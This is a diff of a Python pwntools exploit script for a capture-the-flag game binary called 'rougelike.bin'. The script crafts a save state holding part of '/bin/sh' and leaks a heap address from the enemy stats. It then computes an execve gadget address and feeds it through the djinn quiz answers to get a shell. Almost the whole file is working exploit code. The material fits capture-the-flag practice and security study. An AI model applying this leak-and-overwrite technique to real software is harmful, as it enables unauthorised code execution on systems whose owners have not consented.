@@ -8,124 +8,119 @@ import re
 
 pwn.context.log_level = 'error'
 
+execve_gadget_addr = 0x00005555555633a3
+alloc_dealloc_addr = 0x000055555556c5fe
 
-execve_gadget = 0x00005555555633a3
 rdi_content = 0x7fffffffd5d0
-# /bin/sh:  0x68732F6E69622F
-            
-
 bin_sh = 0x68732F6E69622F
 
+def select_gender(conn, gender):
+    conn.sendlineafter('>', gender)
 
-weapon = 0x00000000
-armor = 0x00000000
-hp = (bin_sh & 0xffffffff) * 2  # the lower 32 bits of the address has to be multiplied by 2, because djinn divides hp by 2.
-healing_potions = 0x00000000
-poisons = 0x00000000
-gold = 0x00000000
-gender = 0x00000010
+def load_state(conn, weapon=0, armor=0, hp=0, healing_potions=0, poisons=0, gold=0, gender=0):
+    conn.sendlineafter('>', '5')
 
-def lsb_hex(v):
-    st = format(v, 'x').zfill(8)
-    bytes = re.findall('..', st)
-    return ''.join(bytes[::-1])
+    def lsb_hex(v):
+        st = format(v, 'x').zfill(8)
+        bytes = re.findall('..', st)
+        return ''.join(bytes[::-1])
 
-save_state=''.join([lsb_hex(v) for v in [weapon, armor, hp, healing_potions, poisons, gold, gender]])
-
-print()
-print(f'save_state: {save_state}')
-
-# conn = pwn.process('./rougelike.bin')
-# #conn = pwn.remote('challenges.crysys.hu', 5010)
-# conn.sendlineafter('>', '1')
-# conn.sendlineafter('>', '5')
-# conn.sendlineafter('state: ', save_state)
-# conn.sendlineafter('>', '2')
+    save_state=''.join([lsb_hex(v) for v in [weapon, armor, hp, healing_potions, poisons, gold, gender]])
+    conn.sendlineafter('state: ', save_state)
 
 
+def buy_granade(conn):
+    conn.sendlineafter('>', '1')
+    conn.sendlineafter('What do you want to buy', '5')
+
+def fight(conn):
+    conn.sendlineafter('>', '2')
+
+def defend(conn):
+    conn.sendlineafter('>', '2')
+
+def no_djinn(conn):
+    conn.sendlineafter('Do you accept the djinn\'s offer?', 'no')
+
+def yes_djinn(conn):
+    conn.sendlineafter('Do you accept the djinn\'s offer?', 'yes')
+
+def use_granade(conn):
+    conn.sendlineafter('>', '5')
+
+def parse_(conn):
+    conn.sendlineafter('>', '1')
+    conn.sendlineafter('What do you want to buy', '5')
+
+def receive_int(conn, search_string):
+    line = conn.recvline_contains(search_string).decode('utf-8')
+    return int(re.search('[0-9]+', line).group())
+
+def upper(addr):
+    return addr >> 32
+
+def lower(addr):
+    return addr & 0xffffffff
+
+def exploit(conn):
+    select_gender(conn, '1')
+
+    hp = lower(bin_sh) * 2  # the lower 32 bits of the address has to be multiplied by 2, because djinn divides hp by 2.
+
+    load_state(
+        conn=conn,
+        hp=hp,
+        weapon=0,
+        armor=0,
+        healing_potions=0,
+        poisons=0,
+        gold=0x66666666,
+        gender=0x10888888
+    )
+   
+    buy_granade(conn)
+
+    fight(conn)
+
+    no_djinn(conn)
+
+    enemy_hp = receive_int(conn, 'Maximum hit points') 
+    enemy_weapon = receive_int(conn, 'Weapon strength')
+
+    use_granade(conn)
+
+    current_dealloc_addr = (enemy_weapon << 32) + enemy_hp
+    current_execve_gadget_addr = current_dealloc_addr - alloc_dealloc_addr + execve_gadget_addr
+
+    fight(conn)
+    yes_djinn(conn)
+
+    for i in range(15):
+        line = conn.recvuntil('? ').decode('utf-8')
+
+        if any([word in line for word in ['AAAAAAAA', 'Unix timestamp', 'Richard Stallman', 'even prime', '3↑↑3']]):
+            conn.sendline('0')
+        elif 'Rust' in line:
+            print(str(upper(bin_sh)))
+            conn.sendline(str(upper(bin_sh)))
+        elif 'Linux released' in line:
+            print(str(lower(current_execve_gadget_addr)))
+            conn.sendline(str((lower(current_execve_gadget_addr) << 32) + 0x11111111))
+        elif 'SecChallenge' in line:
+            print(str(upper(current_execve_gadget_addr)))
+            conn.sendline(str(upper(current_execve_gadget_addr)))
+        else:
+            conn.sendline('1')
 
 
+    input(">")
+    defend(conn)
 
-def addr_from_shop(addr):
-    shop_addr = 0x0000555555561a40 # shop
-    return shop_addr - 0x0010da40 + addr
-
-def addr_from_libc(addr):
-
-    libc_base = 0x00007ffff7ca0c50 - 0x27c50
-    return addr + libc_base
-
-def djinn(addr):
-
-    # conn.sendlineafter('? ', 'yes')
-
-    addr_lower = ((addr & 0xffffffff) << 32) + 0x11111111
-    addr_upper = ((0x11111111) << 32) + (addr >> 32)
-
-    
-    print(f'AAAAAAAA: 0')
-    print(f'Unix timestamp: 0')
-    print(f'Richard Stallman: 0')
-    print(f'Rust standard library {bin_sh >> 32}')
-    print(f'Linux released: {addr_lower}')
-    print(f'SecChallenge: {addr_upper}')
-    print(f'What is the closest even prime to: {0}')
-    print(f'3↑↑3: {0}')
-
-    # for i in range(15):
-    #     r = conn.recvuntil('? ').decode('utf-8')
-    #     print(r)
-    #     if 'Linux released' in r:
-    #         conn.sendline(str(addr_lower))
-    #     elif 'SecChallenge' in r:
-    #         conn.sendline(str(addr_upper))
-    #     else:
-    #         conn.sendline('16705') 
-
-    # r = conn.recvuntil('>').decode('utf-8')
-    # print(r)
-    # conn.sendline('2')
-
-def no_djinn():
-    conn.sendlineafter('? ', 'no')
+    while True:
+        print(conn.recvline())
 
 
-djinn(execve_gadget)
+conn = pwn.process('./rougelike.bin')
+#conn = pwn.remote('challenges.crysys.hu', 5010)
 
-
-
-
-# while True:
-#     r = conn.recvline()#.decode('utf-8')
-#     print(r)
-# # print('x')
-# # conn.sendlineafter('What is the best number?', '1')
-# # conn.sendlineafter('What is the 19th happy prime?', '1')
-# # conn.sendlineafter('What is the order of the Lyons group?', '1')
-# # conn.sendlineafter('Sum all natural numbers; take the reciprocal, then multiply it by -1. What do you get?', '1')
-# # conn.sendlineafter('What is the reciprocal of the fine structure constant?', '1')
-# # conn.sendlineafter('AAAAAAAA (hint: https://www.youtube.com/watch?v=bknybcgfjAk)?', '1')
-# # conn.sendlineafter('What was the Unix timestamp when this challenge was developed?', '1')
-# # conn.sendlineafter('When did Richard Stallman started the GNU project?', '1')
-# # conn.sendlineafter("How many times does the unsafe keyword appear in the source code of the Rust standard library's source code?", '1')
-# # conn.sendlineafter("When was the first version of Linux released?", '1')
-# # conn.sendlineafter("How many challenges remained unsolved during last year's SecChallenge?", '1')
-# # conn.sendlineafter("What is the closest even prime", '1')
-
-
-# while True:
-#     r=conn.recvline().decode('ascii')
-#     print(r)
-#     conn.sendline('1')
-# # r = conn.recvline().decode('ascii')
-# # conn.sendline(str(len(fileContent)))
-# # r = conn.recvline().decode('ascii')
-# # conn.send(fileContent)
-# # r = conn.recvall().decode('ascii')
-# # print(r)
-# # conn.close()
-
-
-# # if addr == 0x41c020:
-# #     print(i)
-# #     break
+exploit(conn)
